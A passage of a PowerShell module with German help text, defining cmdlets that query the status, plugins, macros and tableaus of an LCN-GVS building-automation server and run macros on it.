    .SYNOPSIS
        Ruft den Status des LCN-GVS-Servers ab.
    .DESCRIPTION
        Mit diesem Befehl koennen Sie den Status des LCN-GVS-Servers anzeigen lassen.
    .EXAMPLE
        Get-LCNGVSServerStatus
    .LINK
        Get-LCNGVSServerStatusAsync
        Get-LCNGVSServerPluginInfo
        Get-LCNGVSServerLcnBusConnectionState
#>
function Get-LCNGVSServerStatus # Alias: Get-Status
{
    [CmdletBinding(DefaultParameterSetName='Default',
                  SupportsShouldProcess=$true,
                  PositionalBinding=$false,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Get-LCNGVSServerStatus',
                  ConfirmImpact='Medium')]
    [Alias('Get-Status')]
    [OutputType([LCNGVS.Status.Status])]
    Param
    (
    )

    Begin
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function started"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] ParameterSetName: $($PsCmdlet.ParameterSetName)"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] PSBoundParameters: $($PSBoundParameters | Out-String)"

        # Prueft, ob der Benutzer angemeldet ist.
        if ( -not ($Script:LCNGVSSession.isSuccess)) { Connect-LCNGVS }
    }
    Process
    {
        if ($pscmdlet.ShouldProcess("LCNGVS.Status", $Script:LocalizedData.GetLCNGVSServerStatus))
        {
            if ($Script:LCNGVSSession.IsSuccess)
            {
                try
                {
                    $LCNStatus = $Script:Status1Svc.GetStatus()
                }
                catch [System.Exception]
                {
                    Write-Error $_
                }
                finally
                {
                    $LCNStatus
                }
            }
            else
            {
                Write-Error -Message $Script:LocalizedData.ErrorMessage1
            }
        }
    }
    End
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function ended"
    }
}

<#
    .SYNOPSIS
        Ruft den Status des LCN-GVS-Servers ab.
    .DESCRIPTION
        Mit diesem Befehl koennen Sie den Status des LCN-GVS-Servers anzeigen lassen.
    .EXAMPLE
        Get-LCNGVSServerStatusAsync
    .LINK
        Get-LCNGVSServerStatus
        Get-LCNGVSServerPluginInfo
        Get-LCNGVSServerLcnBusConnectionState
#>
function Get-LCNGVSServerStatusAsync # Alias: Get-StatusAsync
{
    [CmdletBinding(DefaultParameterSetName='Default',
                  SupportsShouldProcess=$true,
                  PositionalBinding=$false,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Get-LCNGVSServerStatus',
                  ConfirmImpact='Medium')]
    [Alias('Get-StatusAsync')]
    [OutputType([LCNGVS.Status.Status])]
    Param
    (
    )

    Begin
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function started"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] ParameterSetName: $($PsCmdlet.ParameterSetName)"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] PSBoundParameters: $($PSBoundParameters | Out-String)"

        # Prueft, ob der Benutzer angemeldet ist.
        if ( -not ($Script:LCNGVSSession.isSuccess)) { Connect-LCNGVS }
    }
    Process
    {
        if ($pscmdlet.ShouldProcess("LCNGVS.Status", $Script:LocalizedData.GetLCNGVSServerStatus))
        {
            if ($Script:LCNGVSSession.IsSuccess)
            {
                try
                {
                    $Script:Status1Svc.GetStatusAsync()
                }
                catch [System.Exception]
                {
                    Write-Error $_
                }
                finally
                {
                }
            }
            else
            {
                Write-Error -Message $Script:LocalizedData.ErrorMessage1
            }
        }
    }
    End
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function ended"
    }
}

<#
    .SYNOPSIS
        Ruft Informationen ueber die installierten Plugins ab.
    .DESCRIPTION
        Mit diesem Befehl koennen Sie Informationen ueber die installierten Plugins, wie beispielsweise die Lizenzen, anzeigen lassen.
    .EXAMPLE
        Get-LCNGVSServerPluginInfo
    .LINK
        Get-LCNGVSServerStatus
        Get-LCNGVSServerStatusAsync
        Get-LCNGVSServerLcnBusConnectionState
#>
function Get-LCNGVSServerPluginInfo # Alias: Get-PluginInfo
{
    [CmdletBinding(DefaultParameterSetName='Default',
                  SupportsShouldProcess=$true,
                  PositionalBinding=$false,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Get-LCNGVSServerPluginInfo',
                  ConfirmImpact='Medium')]
    [Alias('Get-PluginInfo')]
    [OutputType([LCNGVS.Status.PluginInfo[]])]
    Param
    (
        [Parameter(Mandatory=$true,
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true,
                   ValueFromRemainingArguments=$false,
                   Position=0,
                   ParameterSetName='Name')]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [SupportsWildcards()]
        [String[]] $PlugInName,

        [Parameter(Position=0,
                   ParameterSetName='Default')]
        [Switch] $all
    )

    Begin
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function started"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] ParameterSetName: $($PsCmdlet.ParameterSetName)"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] PSBoundParameters: $($PSBoundParameters | Out-String)"

        # Prueft, ob der Benutzer angemeldet ist.
        if ( -not ($Script:LCNGVSSession.isSuccess)) { Connect-LCNGVS }
    }
    Process
    {
        if ($pscmdlet.ShouldProcess("LCNGVS.Status", $Script:LocalizedData.GetLCNGVSServerPluginInfo))
        {
            if ($Script:LCNGVSSession.IsSuccess)
            {
                try
                {
                    $LCNStatus = $Script:Status1Svc.GetStatus()
                }
                catch [System.Exception]
                {
                    Write-Error $_
                }
                finally
                {
                    if ($PSCmdlet.ParameterSetName -eq "Name")
                    {
                        foreach ($PlugIn in $PlugInName)
                        {
                            $LCNStatus.Plugins | Where-Object -Property name -Like -Value $PlugIn
                        }
                    }
                    else
                    {
                        $LCNStatus.Plugins
                    }
                }
            }
            else
            {
                Write-Error -Message $Script:LocalizedData.ErrorMessage1
            }
        }
    }
    End
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function ended"
    }
}

<#
    .SYNOPSIS
        Ruft Informationen ueber die Verbindung des LCN-Busses ab.
    .DESCRIPTION
        Eine LCN-Bus-Verbindung ist die physikalische Verbindung zur Geb�ude-Anlage.
        Mit diesem Befehl koennen Sie Informationen ueber die Verbindung des LCN-Busses anzeigen lassen.
    .EXAMPLE
        Get-LCNGVSServerPluginInfo
    .LINK
        Get-LCNGVSServerStatus
        Get-LCNGVSServerStatusAsync
        Get-LCNGVSServerLcnBusConnectionState
#>
function Get-LCNGVSServerLcnBusConnectionState # Alias: Get-LcnBusConnectionState
{
    [CmdletBinding(DefaultParameterSetName='Default',
                  SupportsShouldProcess=$true,
                  PositionalBinding=$false,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Get-LCNGVSServerLcnBusConnectionState',
                  ConfirmImpact='Medium')]
    [Alias('Get-LcnBusConnectionState')]
    [OutputType([LCNGVS.Status.LcnBusConnectionState[]])]
    Param
    (
        [Parameter(Mandatory=$true,
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true,
                   ValueFromRemainingArguments=$false,
                   Position=0,
                   ParameterSetName='Name')]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [SupportsWildcards()]
        [String] $BusName,

        [Parameter(Position=0,
                   ParameterSetName='Default')]
        [Switch] $all
    )

    Begin
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function started"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] ParameterSetName: $($PsCmdlet.ParameterSetName)"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] PSBoundParameters: $($PSBoundParameters | Out-String)"

        # Prueft, ob der Benutzer angemeldet ist.
        if ( -not ($Script:LCNGVSSession.isSuccess)) { Connect-LCNGVS }
    }
    Process
    {
        if ($pscmdlet.ShouldProcess("LCNGVS.Status", $Script:LocalizedData.GetLCNGVSServerPluginInfo))
        {
            if ($Script:LCNGVSSession.IsSuccess)
            {
                try
                {
                    $LCNStatus = $Script:Status1Svc.GetStatus()
                }
                catch [System.Exception]
                {
                    Write-Error $_
                }
                finally
                {
                    if ($PSCmdlet.ParameterSetName -eq "Name")
                    {
                        $LCNStatus.LcnBusConnectionStates | Where-Object -Property BusName -Like -Value $BusName
                    }
                    else
                    {
                        $LCNStatus.LcnBusConnectionStates
                    }
                }
            }
            else
            {
                Write-Error -Message $Script:LocalizedData.ErrorMessage1
            }
        }
    }
    End
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function ended"
    }
}

#endregion

# -----------------------------------------------
# Webservice: MacroServer1 - Makros
# -----------------------------------------------
#region Komponente: Makros

<#
    .SYNOPSIS
        Ruft den Status des Macroservers ab.
    .DESCRIPTION
        Mit diesem Befehl koennen Sie den derzeitigen Status des Macroservers abrufen.
    .EXAMPLE
        Get-LCNGVSMacroServerIsEnabled
    .LINK
        Set-LCNGVSMacroServerIsEnabled
        Get-LCNGVSMacro
        Get-LCNGVSMacroListAsync
        Invoke-LCNGVSMacro
        Invoke-LCNGVSMacroAsync
#>
function Get-LCNGVSMacroServerIsEnabled
{
    [CmdletBinding(DefaultParameterSetName='Default',
                  SupportsShouldProcess=$true,
                  PositionalBinding=$false,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Get-LCNGVSMacroServerEnabled',
                  ConfirmImpact='Medium')]
    [Alias('Get-LCNGVSMacroServerEnabled')]
    [OutputType([Bool])]
    Param
    (
    )

    Begin
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function started"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] ParameterSetName: $($PsCmdlet.ParameterSetName)"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] PSBoundParameters: $($PSBoundParameters | Out-String)"

        # Prueft, ob der Benutzer angemeldet ist.
        if ( -not ($Script:LCNGVSSession.isSuccess)) { Connect-LCNGVS }
    }
    Process
    {
        if ($pscmdlet.ShouldProcess("LCNGVS.MacroServer", $Script:LocalizedData.GetLCNGVSMacroServerEnabled))
        {
            if ($Script:LCNGVSSession.IsSuccess)
            {
                try
                {
                    $Script:MacroServer1Svc.IsEnabled()
                }
                catch [System.Exception]
                {
                    Write-Error $_
                }
                finally
                {
                }
            }
            else
            {
                Write-Error -Message $Script:LocalizedData.ErrorMessage1
            }
        }
    }
    End
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function ended"
    }
}

<#
    .SYNOPSIS
        Legt den Status des Macroservers fest.
    .DESCRIPTION
        Mit diesem Befehl koennen Sie den Status des Macroservers festlegen.
    .EXAMPLE
        Set-LCNGVSMacroServerIsEnabled -Enabled $true
    .LINK
        Get-LCNGVSMacroServerIsEnabled
        Get-LCNGVSMacro
        Get-LCNGVSMacroListAsync
        Invoke-LCNGVSMacro
        Invoke-LCNGVSMacroAsync
#>
function Set-LCNGVSMacroServerIsEnabled
{
    [CmdletBinding(DefaultParameterSetName='Default',
                  SupportsShouldProcess=$true,
                  PositionalBinding=$false,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Set-LCNGVSMacroServerEnabled',
                  ConfirmImpact='Medium')]
    [Alias('Set-LCNGVSMacroServerEnabled')]
    [OutputType([Bool])]
    Param
    (
        [Parameter(Mandatory=$true,
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true,
                   ValueFromRemainingArguments=$false,
                   Position=0,
                   ParameterSetName='Default')]
        [bool] $Enabled
    )

    Begin
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function started"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] ParameterSetName: $($PsCmdlet.ParameterSetName)"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] PSBoundParameters: $($PSBoundParameters | Out-String)"

        # Prueft, ob der Benutzer angemeldet ist.
        if ( -not ($Script:LCNGVSSession.isSuccess)) { Connect-LCNGVS }
    }
    Process
    {
        if ($pscmdlet.ShouldProcess("LCNGVS.MacroServer", $Script:LocalizedData.SetLCNGVSMacroServerEnabled))
        {
            if ($Script:LCNGVSSession.IsSuccess)
            {
                try
                {
                    $Script:MacroServer1Svc.SetEnabled($Enabled)
                }
                catch [System.Exception]
                {
                    Write-Error $_
                }
                finally
                {
                }
            }
            else
            {
                Write-Error -Message $Script:LocalizedData.ErrorMessage1
            }
        }
    }
    End
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function ended"
    }
}

<#
    .SYNOPSIS
        Ruft das Macro ab.
    .DESCRIPTION
        Makros sind Aktions-/Befehlsketten, die mit einem eindeutigen Namen versehen werden und dann beliebig oft ausgefuehrt werden koennen.
        Mit diesem Befehl koennen Sie die im LCN-GVS eingerichteten Makros abrufen.
    .EXAMPLE
        Get-LCNGVSMacro
    .EXAMPLE
        Get-LCNGVSMacro -all
    .EXAMPLE
        Get-LCNGVSMacro -macroName "Garagen*"
    .EXAMPLE
        Get-LCNGVSMacro -macroName "Geragentor oeffnen"
    .LINK
        Get-LCNGVSMacroServerIsEnabled
        Set-LCNGVSMacroServerIsEnabled
        Get-LCNGVSMacroListAsync
        Invoke-LCNGVSMacro
        Invoke-LCNGVSMacroAsync
#>
function Get-LCNGVSMacro
{
    [CmdletBinding(DefaultParameterSetName='Default',
                  SupportsShouldProcess=$true,
                  PositionalBinding=$false,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Get-LCNGVSMacro',
                  ConfirmImpact='Medium')]
    [Alias()]
    [OutputType([LCNGVS.MacroServer.Macro[]])]
    Param
    (
        [Parameter(Mandatory=$true,
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true,
                   ValueFromRemainingArguments=$false,
                   Position=0,
                   ParameterSetName='Name')]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [SupportsWildcards()]
        [String] $macroName,

        [Parameter(Position=0,
                   ParameterSetName='Default')]
        [Switch] $all
    )

    Begin
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function started"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] ParameterSetName: $($PsCmdlet.ParameterSetName)"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] PSBoundParameters: $($PSBoundParameters | Out-String)"

        # Prueft, ob der Benutzer angemeldet ist.
        if ( -not ($Script:LCNGVSSession.isSuccess)) { Connect-LCNGVS }
    }
    Process
    {
        if ($pscmdlet.ShouldProcess("LCNGVS.MacroServer", $Script:LocalizedData.GetLCNGVSMacro))
        {
            if ($Script:LCNGVSSession.IsSuccess)
            {
                try
                {
                    $MacroList = $Script:MacroServer1Svc.GetMacros()
                }
                catch [System.Exception]
                {
                    Write-Error $_
                }
                finally
                {
                    if ($PSCmdlet.ParameterSetName -eq "Name")
                    {
                        $MacroList | Where-Object -Property name -Like -Value $macroName
                    }
                    else
                    {
                        $MacroList
                    }
                }
            }
            else
            {
                Write-Error -Message $Script:LocalizedData.ErrorMessage1
            }
        }
    }
    End
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function ended"
    }
}

<#
    .SYNOPSIS
        Ruft eine Liste von verfuegbaren Makros ab.
    .DESCRIPTION
        Makros sind Aktions-/Befehlsketten, die mit einem eindeutigen Namen versehen werden und dann beliebig oft ausgefuehrt werden koennen.
        Mit diesem Befehl koennen Sie die im LCN-GVS eingerichteten Makros abrufen.
    .EXAMPLE
        Get-LCNGVSMacroListAsync
    .LINK
        Get-LCNGVSMacroServerIsEnabled
        Set-LCNGVSMacroServerIsEnabled
        Get-LCNGVSMacro
        Invoke-LCNGVSMacro
        Invoke-LCNGVSMacroAsync
#>
function Get-LCNGVSMacroListAsync
{
    [CmdletBinding(DefaultParameterSetName='Default',
                  SupportsShouldProcess=$true,
                  PositionalBinding=$false,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Get-LCNGVSMacroAsync',
                  ConfirmImpact='Medium')]
    [Alias()]
    [OutputType([LCNGVS.MacroServer.Macro[]])]
    Param
    (
    )

    Begin
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function started"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] ParameterSetName: $($PsCmdlet.ParameterSetName)"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] PSBoundParameters: $($PSBoundParameters | Out-String)"

        # Prueft, ob der Benutzer angemeldet ist.
        if ( -not ($Script:LCNGVSSession.isSuccess)) { Connect-LCNGVS }
    }
    Process
    {
        if ($pscmdlet.ShouldProcess("LCNGVS.MacroServer", $Script:LocalizedData.GetLCNGVSMacro))
        {
            if ($Script:LCNGVSSession.IsSuccess)
            {
                try
                {
                    $Script:MacroServer1Svc.GetMacrosAsync()
                }
                catch [System.Exception]
                {
                    Write-Error $_
                }
                finally
                {
                }
            }
            else
            {
                Write-Error -Message $Script:LocalizedData.ErrorMessage1
            }
        }
    }
    End
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function ended"
    }
}

<#
    .SYNOPSIS
        Fuehrt das angegebene Makro aus.
    .DESCRIPTION
        Makros sind Aktions-/Befehlsketten, die mit einem eindeutigen Namen versehen werden und dann beliebig oft ausgefuehrt werden koennen.
        Mit diesem Befehl koennen Sie die im LCN-GVS eingerichteten Makros ausfuehren.
    .PARAMETER macroName
        Geben Sie den eindeutigen Namen des Makros an.
    .EXAMPLE
        Invoke-LCNGVSMacro -macroName "Garagentor oeffnen"
    .LINK
        Invoke-LCNGVSMacroAsync
        Get-LCNGVSMacroServerIsEnabled
        Set-LCNGVSMacroServerIsEnabled
        Get-LCNGVSMacro
        Get-LCNGVSMacroListAsync
#>
function Invoke-LCNGVSMacro
{
    [CmdletBinding(DefaultParameterSetName='Default',
                  SupportsShouldProcess=$true,
                  PositionalBinding=$false,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Invoke-LCNGVSMacro',
                  ConfirmImpact='Medium')]
    [Alias()]
    [OutputType([bool])]
    Param
    (
        [Parameter(Mandatory=$true,
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true,
                   ValueFromRemainingArguments=$false,
                   Position=0,
                   ParameterSetName='Default')]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [Alias("name")]
        [String[]] $macroName
    )

    Begin
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function started"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] ParameterSetName: $($PsCmdlet.ParameterSetName)"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] PSBoundParameters: $($PSBoundParameters | Out-String)"

        # Prueft, ob der Benutzer angemeldet ist.
        if ( -not ($Script:LCNGVSSession.isSuccess)) { Connect-LCNGVS }
    }
    Process
    {
        foreach ($macro in $macroName)
        {
            if ($pscmdlet.ShouldProcess("LCNGVS.MacroServer", ($Script:LocalizedData.InvokeLCNGVSMacro -f $macro)))
            {
                if ($Script:LCNGVSSession.IsSuccess)
                {
                    try
                    {
                        $Script:MacroServer1Svc.ExecuteMacro($macro)
                    }
                    catch [System.Exception]
                    {
                        Write-Error $_
                    }
                    finally
                    {
                    }
                }
                else
                {
                    Write-Error -Message $Script:LocalizedData.ErrorMessage1
                }
            }
        }
    }
    End
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function ended"
    }
}

<#
    .SYNOPSIS
        Fuehrt das angegebene Makro aus.
    .DESCRIPTION
        Makros sind Aktions-/Befehlsketten, die mit einem eindeutigen Namen versehen werden und dann beliebig oft ausgefuehrt werden koennen.
        Mit diesem Befehl koennen Sie die im LCN-GVS eingerichteten Makros ausfuehren.
    .PARAMETER macroName
        Legt das auszufuehrende Makro fest.
    .EXAMPLE
        Invoke-LCNGVSMacroAsync -macroName "Garagentor oeffnen"
    .LINK
        Invoke-LCNGVSMacro
        Get-LCNGVSMacroServerIsEnabled
        Set-LCNGVSMacroServerIsEnabled
        Get-LCNGVSMacro
        Get-LCNGVSMacroListAsync
#>
function Invoke-LCNGVSMacroAsync
{
    [CmdletBinding(DefaultParameterSetName='Default',
                  SupportsShouldProcess=$true,
                  PositionalBinding=$false,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Invoke-LCNGVSMacroAsync',
                  ConfirmImpact='Medium')]
    [Alias()]
    [OutputType([bool])]
    Param
    (
        [Parameter(Mandatory=$true,
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true,
                   ValueFromRemainingArguments=$false,
                   Position=0,
                   ParameterSetName='Default')]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [Alias('name')]
        [String[]] $macroName
    )

    Begin
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function started"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] ParameterSetName: $($PsCmdlet.ParameterSetName)"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] PSBoundParameters: $($PSBoundParameters | Out-String)"

        # Prueft, ob der Benutzer angemeldet ist.
        if ( -not ($Script:LCNGVSSession.isSuccess)) { Connect-LCNGVS }
    }
    Process
    {
        foreach ($_macroName in $macroName)
        {
            if ($pscmdlet.ShouldProcess("LCNGVS.MacroServer", ($Script:LocalizedData.InvokeLCNGVSMacro -f $_macroName)))
            {
                if ($Script:LCNGVSSession.IsSuccess)
                {
                    try
                    {
                        $Script:MacroServer1Svc.ExecuteMacroAsync($_macroName)
                    }
                    catch [System.Exception]
                    {
                        Write-Error $_
                    }
                    finally
                    {
                    }
                }
                else
                {
                    Write-Error -Message $Script:LocalizedData.ErrorMessage1
                }
            }
        }
    }
    End
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function ended"
    }
}

#endregion

# -----------------------------------------------
# Webservice: Tableau1 - Tableaugruppen, Tableaus, Steuerelemente und TrendLogs
#
# ToDo:
# - Tableau-Aufruf: Parameter OpenInBrowser, Nutzung von control.aspx
# |-> Siehe http://localhost/lcngvs/help/de/index.html?anmeldung2.htm
#
# -----------------------------------------------
#region Komponente: Tableau

<#
    .SYNOPSIS
        Ruft die Tableaugruppen ab.
    .DESCRIPTION
        Mit diesem Befehl koennen Sie die im LCN-GVS eingerichteten Tableaugruppen abrufen.
    .EXAMPLE
        Get-LCNGVSTableauGroupInfo
    .LINK
        Open-LCNGVSTableau
        Close-LCNGVSTableau
        Get-LCNGVSImage
        Export-LCNGVSImage
        Get-LCNGVSControl
        Get-LCNGVSControlUpdateList
        Invoke-LCNGVSButton
        Invoke-LCNGVSDimmer
#>
function Get-LCNGVSTableauGroupInfo # Alias: Get-Tableaus
{
    [CmdletBinding(DefaultParameterSetName='Default',
                  SupportsShouldProcess=$true,
                  PositionalBinding=$false,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Get-LCNGVSTableauGroupInfo',
                  ConfirmImpact='Medium')]
    [Alias('Get-LCNGVSTableauList','Get-Tableaus')]
    [OutputType([LCNGVS.Tableau.TableauGroupInfo[]])]
    Param
    (
        [Parameter(Mandatory=$true,
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true,
                   ValueFromRemainingArguments=$false,
                   Position=0,
                   ParameterSetName='Name')]
        [SupportsWildcards()]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [String] $tableauGroupName,

        [Parameter(Position=0,
                   ParameterSetName='Default')]
        [Switch] $all
    )

    Begin
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function started"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] ParameterSetName: $($PsCmdlet.ParameterSetName)"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] PSBoundParameters: $($PSBoundParameters | Out-String)"

        # Prueft, ob der Benutzer angemeldet ist.
        if ( -not ($Script:LCNGVSSession.isSuccess)) { Connect-LCNGVS }
    }
    Process
    {
        if ($pscmdlet.ShouldProcess("LCNGVS.Tableau", $Script:LocalizedData.GetLCNGVSTableauGroupInfo))
        {
            if ($Script:LCNGVSSession.IsSuccess)
            {
                try
                {
                    $TableauGroupInfoList = $Script:Tableau1Svc.GetTableaus()
                }
                catch [System.Exception]
                {
                    Write-Error $_
                }
                finally
                {
                    if ($PSCmdlet.ParameterSetName -eq "Name")
                    {
                        $TableauGroupInfoList | Where-Object -Property name -Like -Value $tableauGroupName
                    }
                    else
                    {
                        $TableauGroupInfoList
                    }
                }
            }
            else
            {
                Write-Error -Message $Script:LocalizedData.ErrorMessage1
            }
        }
    }
    End
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function ended"
    }
}

<#
    .SYNOPSIS
        Oeffnet eine neue TableauSession.
    .DESCRIPTION
        Mit diesem Befehl koennen Sie eine Sitzung fuer ein im LCN-GVS eingerichteten Tableau oeffnen.
    .EXAMPLE
        Open-LCNGVSTableau
    .LINK
        Get-LCNGVSTableauGroupInfo
        Close-LCNGVSTableau
        Get-LCNGVSImage
        Export-LCNGVSImage
        Get-LCNGVSControl
        Get-LCNGVSControlUpdateList
        Invoke-LCNGVSButton
        Invoke-LCNGVSDimmer
#>
function Open-LCNGVSTableau # Alias: Open-Tableau
{
    [CmdletBinding(DefaultParameterSetName='Default',
                  SupportsShouldProcess=$true,
                  PositionalBinding=$false,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Get-LCNGVSTableau',
                  ConfirmImpact='Medium')]
    [Alias('Get-LCNGVSTableau','Open-Tableau')]
    [OutputType([LCNGVS.Tableau.Tableau])]
    Param
    (
        # Hilfebeschreibung zu Param1
        [Parameter(Mandatory=$true,
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true,
                   ValueFromRemainingArguments=$false,
                   Position=0,
                   ParameterSetName='Default')]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [String] $tableauGroupName,

        # Hilfebeschreibung zu Param2
        [Parameter(Mandatory=$true,
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true,
                   ValueFromRemainingArguments=$false,
                   Position=1,
                   ParameterSetName='Default')]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [String] $tableauId,

        # Hilfebeschreibung zu Param1
        [Parameter(Mandatory=$true,
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true,
                   ValueFromRemainingArguments=$false,
                   Position=0,
                   ParameterSetName='Uri')]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [String] $TableauUri,

        [Parameter(Mandatory=$false,
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true,
                   ValueFromRemainingArguments=$false,
                   Position=1,
                   ParameterSetName='Uri')]
        [Parameter(Mandatory=$false,
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true,
                   ValueFromRemainingArguments=$false,
                   Position=2,
                   ParameterSetName='Default')]
        [Switch] $SetAsLastTableau
    )

    Begin
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function started"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] ParameterSetName: $($PsCmdlet.ParameterSetName)"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] PSBoundParameters: $($PSBoundParameters | Out-String)"

        # Prueft, ob der Benutzer angemeldet ist.
        if ( -not ($Script:LCNGVSSession.isSuccess)) { Connect-LCNGVS }

        if ($pscmdlet.ParameterSetName -eq 'Uri')
        {
            [String[]] $string = $TableauUri.Split('\')
            $tableauGroupName = $string[0]
            $tableauId = $string[1]
        }
    }
    Process
    {
        if ($pscmdlet.ShouldProcess("LCNGVS.Tableau", $Script:LocalizedData.OpenLCNGVSTableau))
        {
            if ($Script:LCNGVSSession.IsSuccess)
            {
                try
                {
                    $Tableau = $Script:Tableau1Svc.OpenTableau($tableauGroupName, $tableauId)
                }
                catch [System.Exception]
                {
                    Write-Error $_
                }
                finally
                {
                    $Tableau
                }
            }
            else
            {
                Write-Error -Message $Script:LocalizedData.ErrorMessage1
            }
        }
    }
    End
    {
        if ($SetAsLastTableau) {Set-LCNGVSLastTableauUri -Tableau $Tableau | Out-Null}

        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function ended"
    }
}

<#
    .SYNOPSIS
        Schliesst die angegebene TableauSession.
    .DESCRIPTION
        Mit diesem Befehl koennen Sie eine geoeffnete Sitzung schliessen.
    .EXAMPLE
        Close-LCNGVSTableau
    .LINK
        Get-LCNGVSTableauGroupInfo
        Open-LCNGVSTableau
        Get-LCNGVSImage
        Export-LCNGVSImage
        Get-LCNGVSControl
        Get-LCNGVSControlUpdateList
        Invoke-LCNGVSButton
        Invoke-LCNGVSDimmer
#>
function Close-LCNGVSTableau # Alias: Close-Tableau
{
    [CmdletBinding(DefaultParameterSetName='Default',
                  SupportsShouldProcess=$true,
                  PositionalBinding=$false,
                  HelpUri = 'https://github.com/lmissel/ISSENDORFF.LCNGVS.Commands/tree/master/Help/Get-LCNGVSTableau',
                  ConfirmImpact='Medium')]
    [Alias('Close-Tableau')]
    [OutputType([bool])]
    Param
    (
        # Hilfebeschreibung zu Param1
        [Parameter(Mandatory=$true,
                   ValueFromPipeline=$true,
                   ValueFromPipelineByPropertyName=$true,
                   ValueFromRemainingArguments=$false,
                   Position=0,
                   ParameterSetName='Default')]
        [ValidateNotNull()]
        [ValidateNotNullOrEmpty()]
        [int] $tableauSessionId
    )

    Begin
    {
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] Function started"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] ParameterSetName: $($PsCmdlet.ParameterSetName)"
        Write-Verbose "[$($MyInvocation.MyCommand.Name)] PSBoundParameters: $($PSBoundParameters | Out-String)"

